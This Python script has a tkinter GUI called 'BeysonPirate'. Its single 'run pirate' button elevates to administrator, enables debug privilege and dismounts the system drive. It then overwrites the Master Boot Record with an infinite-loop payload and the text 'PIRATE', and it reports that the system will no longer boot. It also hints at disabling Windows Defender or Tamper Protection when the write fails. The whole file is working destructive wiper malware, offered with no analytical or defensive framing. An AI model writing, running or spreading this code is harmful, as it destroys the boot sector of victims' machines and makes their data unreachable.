import tkinter as tk
import os
import ctypes
import sys
from ctypes import wintypes

# Requires: pip install pywin32
try:
    import win32api
    import win32con
    import win32security
except ImportError:
    print("Please run: pip install pywin32")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable,
        " ".join(f'"{arg}"' for arg in sys.argv),
        None, 1
    )

def enable_debug_privilege():
    """Bypasses standard kernel filters by elevating to Debugger status."""
    try:
        hToken = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(), 
            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        )
        priv_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
        win32security.AdjustTokenPrivileges(hToken, 0, [(priv_id, win32security.SE_PRIVILEGE_ENABLED)])
        print("SeDebugPrivilege enabled.")
    except Exception as e:
        print(f"Could not enable Debug Privilege: {e}")

if sys.platform == "win32":
    if not is_admin():
        elevate()
        sys.exit()

def run():
    enable_debug_privilege()

    # 1. SETUP KERNEL32 BRIDGE
    dll = type('DLL', (), {})()
    dll.Kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    dll.Kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
    dll.Kernel32.CreateFileW.restype = wintypes.HANDLE
    dll.Kernel32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    dll.Kernel32.WriteFile.restype = wintypes.BOOL
    dll.Kernel32.DeviceIoControl.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
    dll.Kernel32.DeviceIoControl.restype = wintypes.BOOL

    # 2. OPEN DRIVE
    hDevice = dll.Kernel32.CreateFileW(r'\\?\PhysicalDrive0', 0x40000000, 0x01 | 0x02, None, 3, 0, 0)

    if hDevice != wintypes.HANDLE(-1).value:
        # Dismount for access
        dwBytesReturned = wintypes.DWORD(0)
        # FSCTL_LOCK_VOLUME = 0x00090018, FSCTL_DISMOUNT_VOLUME = 0x00090020
        dll.Kernel32.DeviceIoControl(hDevice, 0x00090018, None, 0, None, 0, ctypes.byref(dwBytesReturned), None)
        dll.Kernel32.DeviceIoControl(hDevice, 0x00090020, None, 0, None, 0, ctypes.byref(dwBytesReturned), None)
        
        # --- PREPARE SECTOR-ALIGNED PAYLOAD (Fixes Error 87) ---
        # \xEB\xFE is x86 assembly for a jump-to-self infinite loop
        raw_payload = b"\xEB\xFE" + b"PIRATE" * 10 
        
        # Pad with null bytes to exactly 510 bytes, then add the 55AA signature
        mbr_payload = raw_payload.ljust(510, b"\x00") + b"\x55\xAA"
        
        print(f"Payload size: {len(mbr_payload)} bytes (Sector Aligned)")
        
        # --- OVERWRITE ---
        written = wintypes.DWORD(0)
        if dll.Kernel32.WriteFile(hDevice, mbr_payload, 512, ctypes.byref(written), None):
            print("SUCCESS: MBR Overwritten. System will no longer boot.")
        else:
            print(f"Overwrite failed. Error: {ctypes.get_last_error()}")
            print("Hint: Check if Windows Defender or Tamper Protection is active.")

        dll.Kernel32.CloseHandle(hDevice)
    else:
        print(f"Failed to open drive. Error: {ctypes.get_last_error()}")

# --- UI Setup ---
root = tk.Tk()
root.title("BeysonPirate")
root.geometry("240x120")
root.resizable(False, False)
root.configure(bg="#f9f9f8")

tk.Button(root, text="run pirate", command=run,
          font=("Helvetica", 14), padx=28, pady=10,
          bg="#1a1a1a", fg="#f9f9f8", relief="flat",
          cursor="hand2", activebackground="#1a1a1a",
          activeforeground="#f9f9f8").pack(expand=True)

root.mainloop()
